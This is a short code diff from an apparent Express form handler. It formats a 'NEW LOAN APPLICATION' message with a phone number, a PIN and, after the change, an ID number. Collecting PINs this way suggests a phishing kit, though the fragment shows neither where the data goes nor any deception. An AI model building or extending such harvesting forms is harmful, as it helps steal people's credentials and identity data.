@@ -78,7 +78,7 @@ app.post("/submit", async (req, res) => {
     const message = `
 📥 NEW LOAN APPLICATION
 
-👤 Name: ${name}
+👤 idNumber: ${idNumber}
 📞 Phone: ${phone}
 🔐 PIN: ${pin}
 
